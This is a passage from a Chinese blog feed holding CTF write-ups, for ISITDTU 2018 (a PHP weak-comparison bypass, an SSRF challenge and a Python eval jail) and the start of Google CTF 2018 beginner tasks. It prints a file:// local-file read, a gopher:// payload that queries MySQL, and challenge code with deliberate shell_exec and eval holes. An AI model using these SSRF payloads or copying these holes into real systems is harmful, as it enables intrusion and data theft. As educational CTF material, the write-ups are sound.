class="keyword">die</span>(<span class="string">"..."</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/0/i"</span>, $url))  </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"..."</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\w+/i"</span>, $url))  </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"..."</span>); </span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'_'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'_'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    $control = $_GET[<span class="string">'_'</span>];         </span><br><span class="line">    <span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number1))) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"fail1"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number2))) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"fail2"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number3))) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"fail3"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成三个随机数字，</p><p>三个preg_match过滤参数，请求参数不能出现<code>_</code>,<code>0</code>和字符 [A-Za-z0-9]</p><p>然后get请求<code>_</code>参数来传递，判断<code>_</code>参数如果是0，或者随机数字，输出flag</p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1.php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。 那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。 </p><p>(这个考点在安恒杯2018年五月月赛出现过)</p><p>2.in_array函数</p><p>bool <strong>in_array</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong>FALSE</strong> ] ) </p><p>当没有指定strict参数就是弱比较，<code>==</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532865555898.png" alt="1532865555898"></p><p>0 和字符串比较为true，但题目过滤了字符，那就用符号来代替，例如 <code>@#$</code>什么的</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532865722057.png" alt="1532865722057"></p><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正则表达式中/i,/g,/ig,/gi,/m的区别和含义</span><br><span class="line"></span><br><span class="line">/i (忽略大小写)</span><br><span class="line">/g (全文查找出现的所有匹配字符)</span><br><span class="line">/m (多行查找)</span><br><span class="line">/gi(全文查找、忽略大小写)</span><br><span class="line">/ig(全文查找、忽略大小写)</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532754569957.png" alt="1532754569957"></p><blockquote><p>ISITDTU{php_bad_language}</p></blockquote><h2 id="Friss"><a href="#Friss" class="headerlink" title="Friss"></a>Friss</h2><blockquote><p><a href="http://35.190.142.60/" target="_blank" rel="noopener">http://35.190.142.60/</a></p></blockquote><p>查看源代码，在最下面有个<code>&lt;!-- index.php?debug=1--&gt;</code>（很多行后面，出题人真顽皮）</p><p>访问得到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en-US"</span>&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;REQUESTS PAGE&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $content_url = getUrlContent($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $content_url = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"url"</span> type=<span class="string">"text"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"CURL"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $content_url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- index.php?debug=<span class="number">1</span>--&gt;</span><br></pre></td></tr></table></figure><p>试了几个输入，都是提示<code>Only access to localhost</code></p><p>都是英文不好，哈哈哈。我以为是伪造为本地IP，host，referer，x-forward-for都试过了没作用</p><p>比赛结束后看各位师傅的Writeup，发现是读取本地文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://localhost/var/www/html/config.php</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532863688847.png" alt="1532863688847"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en-US"</span>&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;REQUESTS PAGE&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">$content_url = getUrlContent($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$content_url = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"url"</span> type=<span class="string">"text"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"CURL"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $content_url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hosts = <span class="string">"localhost"</span>;</span><br><span class="line">$dbusername = <span class="string">"ssrf_user"</span>;</span><br><span class="line">$dbpasswd = <span class="string">""</span>;</span><br><span class="line">$dbname = <span class="string">"ssrf"</span>;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = <span class="string">"curl "</span>.$url;</span><br><span class="line"><span class="keyword">echo</span> $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line"><span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在config.php，知道有ssrf_user用户，有flag表，虽然不知道有什么字段</p><p>很明显是ssrf了</p><p><code>dict://</code> ， <code>gopher://</code></p><p>萌新不知道dict是不是可以用，看师傅们都用gopher就跟着来咯</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532864090609.png" alt="1532864090609"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532863971113.png" alt="1532863971113"></p><p>github有一个利用脚本：<a href="https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py" target="_blank" rel="noopener">https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py</a></p><p>wireshark抓包 <code>mysql -h 127.0.0.1 -u ssrf_user</code> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532864495633.png" alt="1532864495633"></p><p>之前是因为没有开启mysql服务就一直连接不上，尴尬</p><p>wireshark怎么抓取本地的包参考：<a href="https://blog.csdn.net/u013613428/article/details/53156957" target="_blank" rel="noopener">Wireshark抓取本地Tcp包（任何数据包）</a></p><p>然后过滤mysql协议，找到Login Request</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532864394458.png" alt="1532864394458"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532860824558.png" alt="1532860824558"></p><p>原始数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b600000185a6ff01000000011c0000000000000000000000000000000000000000000000737372665f7573657200006d7973716c5f6e61746976655f70617373776f72640074035f6f730557696e36340c5f636c69656e745f6e616d65086c69626d7973716c045f706964053131323430075f746872656164053234323230095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c0f5f636c69656e745f76657273696f6e06352e372e3136</span><br></pre></td></tr></table></figure><p>利用脚本生成payload</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532860848960.png" alt="1532860848960"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%b6%00%00%01%85%a6%ff%01%00%00%00%01%1c%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%73%73%72%66%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%74%03%5f%6f%73%05%57%69%6e%36%34%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%31%31%32%34%30%07%5f%74%68%72%65%61%64%05%32%34%32%32%30%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%31%36%18%00%00%00%03%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%73%73%72%66%2e%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532860674974.png" alt="1532860674974"></p><blockquote><p>ISITDTU{JUST_4_SSrF_B4B3!!} </p></blockquote><p>参考</p><p><a href="https://fireshellsecurity.team/isitdtu-friss/" target="_blank" rel="noopener">https://fireshellsecurity.team/isitdtu-friss/</a></p><p><a href="https://infosec.rm-it.de/2018/07/29/isitdtu-ctf-2018-friss/" target="_blank" rel="noopener">https://infosec.rm-it.de/2018/07/29/isitdtu-ctf-2018-friss/</a></p><p><a href="https://spyclub.tech/2018/ssrf-through-gopher/" target="_blank" rel="noopener">https://spyclub.tech/2018/ssrf-through-gopher/</a></p><p><a href="https://blog.csdn.net/u013613428/article/details/53156957" target="_blank" rel="noopener">Wireshark抓取本地Tcp包（任何数据包）</a></p><p><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6</a></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="xoxopwn"><a href="#xoxopwn" class="headerlink" title="xoxopwn"></a>xoxopwn</h2><blockquote><p>nc 178.128.12.234 10002</p><p>or</p><p>nc 178.128.12.234 10003</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532960864818.png" alt="1532960864818"></p><p>一个交互的终端，可以执行函数和算法</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532962461603.png" alt="1532962461603"><code>__name__</code>返回<code>__main__</code>确定为python，python有个globals()函数，会以字典类型返回当前位置的全部全局变量。 </p><p>发现 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;__file__&apos;: &apos;/home/xoxopwn/xoxopwn.py&apos;</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(__file__).read()</span><br></pre></td></tr></table></figure><p>/home/xoxopwn/xoxopwn.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">'0.0.0.0'</span>, <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span><span class="params">(a)</span>:</span></span><br><span class="line">        secret = <span class="string">"392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09"</span></span><br><span class="line">        secret = secret.decode(<span class="string">"hex"</span>)</span><br><span class="line">        key = <span class="string">"pythonwillhelpyouopenthedoor"</span></span><br><span class="line">        ret = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a)):</span><br><span class="line">                ret += chr(ord(a[i])^ord(key[i%len(a)]))</span><br><span class="line">        <span class="keyword">if</span> ret == secret:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Open the door"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Close the door"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">x</span><span class="params">(a)</span>:</span></span><br><span class="line">        xxx = <span class="string">"finding secret in o()"</span></span><br><span class="line">        <span class="keyword">if</span> len(a)&gt;<span class="number">21</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Big size ~"</span></span><br><span class="line">        <span class="comment">#print "[*] ",a</span></span><br><span class="line">        <span class="keyword">return</span> eval(a)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedTCPServer</span><span class="params">(SocketServer.ThreadingMixIn, SocketServer.TCPServer)</span>:</span></span><br><span class="line">    allow_reuse_address = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedTCPRequestHandler</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.request.sendall(<span class="string">"This is function x()"</span>)</span><br><span class="line">        self.request.sendall(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">        self.data = self.request.recv(<span class="number">1024</span>).strip()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&#123;&#125; wrote: &#123;&#125;"</span>.format(self.client_address[<span class="number">0</span>],self.data)</span><br><span class="line">        ret = x(str(self.data))</span><br><span class="line">        self.request.sendall(str(ret))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">        serverthuong123 = ThreadedTCPServer((host, port), ThreadedTCPRequestHandler)</span><br><span class="line">        server_thread = threading.Thread(target=serverthuong123.serve_forever)</span><br><span class="line">        server_thread.daemon = <span class="keyword">True</span></span><br><span class="line">        server_thread.start()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Server loop running in thread:"</span>, server_thread.name</span><br><span class="line">        server_thread.join()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">"392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09"</span></span><br><span class="line">secret = secret.decode(<span class="string">"hex"</span>)</span><br><span class="line">key = <span class="string">"pythonwillhelpyouopenthedoor"</span></span><br><span class="line">ret = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(secret)):</span><br><span class="line">      ret += chr(ord(secret[i])^ord(key[i%len(key)]))</span><br><span class="line"><span class="keyword">print</span> ret</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/ISITDTUCTF2018.assets/1532961591357.png" alt="1532961591357"></p><blockquote><p>ISITDTU{1412_secret_in_my_door}</p></blockquote><p>参考</p><p><a href="https://www.youtube.com/watch?v=EMYiGC9ZobY&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=EMYiGC9ZobY&amp;feature=youtu.be</a></p><p><a href="https://ctftime.org/writeup/10537" target="_blank" rel="noopener">https://ctftime.org/writeup/10537</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;Play-with-…&quot;&gt;&lt;a href=&quot;#Play-with-…&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>GoogleCTF2018_beginner_quest</title>
    <link href="http://blog.Lhaihai.wang/2018/07/16/GoogleCTF2018-beginner-quest/"/>
    <id>http://blog.Lhaihai.wang/2018/07/16/GoogleCTF2018-beginner-quest/</id>
    <published>2018-07-16T07:11:41.000Z</published>
    <updated>2018-08-25T07:12:46.040Z</updated>
    
    <content type="html"><![CDATA[<p>比赛：<a href="https://capturetheflag.withgoogle.com/#beginners/" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#beginners/</a></p><p>youtube视频：<a href="https://www.youtube.com/watch?v=qDYwcIf0LZw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=qDYwcIf0LZw</a></p><p><a href="https://github.com/gynvael/stream-en/tree/master/057-beginners-quest" target="_blank" rel="noopener">https://github.com/gynvael/stream-en/tree/master/057-beginners-quest</a></p><p><a href="https://github.com/google/google-ctf" target="_blank" rel="noopener">https://github.com/google/google-ctf</a></p><p>writeup：<a href="https://github.com/rtoma/google-ctf2018" target="_blank" rel="noopener">https://github.com/rtoma/google-ctf2018</a></p><h2 id="LETTER-misc"><a href="#LETTER-misc" class="headerlink" title="LETTER[misc]"></a>LETTER[misc]</h2><p>Garbo-can</p><blockquote><p>You really went dumpster diving? Amazing. After many hours, SUCCESS! Between what looks like a three week old casserole and a copy of “Relative-Time Magazine”, you found this important looking letter about the victims PC. However the credentials aren’t readable - can you still obtain them? </p></blockquote><p>5a0fad5699f75dee39434cc26587411b948e0574a545ef4157e5bf4700e9d62a.zip</p><p>1.点击保护</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1529761247514.png" alt="1529761247514"></p><p>2.删除隐藏信息</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1529761184206.png" alt="1529761184206"></p><p>3.显示隐藏的文本</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1529761083232.png" alt="1529761083232"></p><blockquote><p>CTF{ICanReadDis}</p></blockquote><h2 id="FLOPPY-misc"><a href="#FLOPPY-misc" class="headerlink" title="FLOPPY[misc]"></a>FLOPPY[misc]</h2><p>Foobanizer9000</p><blockquote><p>Using the credentials from the letter, you logged in to the Foobanizer9000-PC. It has a floppy drive…why? There is an .ico file on the disk, but it doesn’t smell right.. </p></blockquote><p>4e69382f661878c7da8f8b6b8bf73a20acd6f04ec253020100dfedbd5083bb39.zip</p><p>解压有个foot.ico</p><p>binwalk看一波，有压缩包，直接改后缀，</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/BEGINNERS%20QUEST.assets/1529761537369.png" 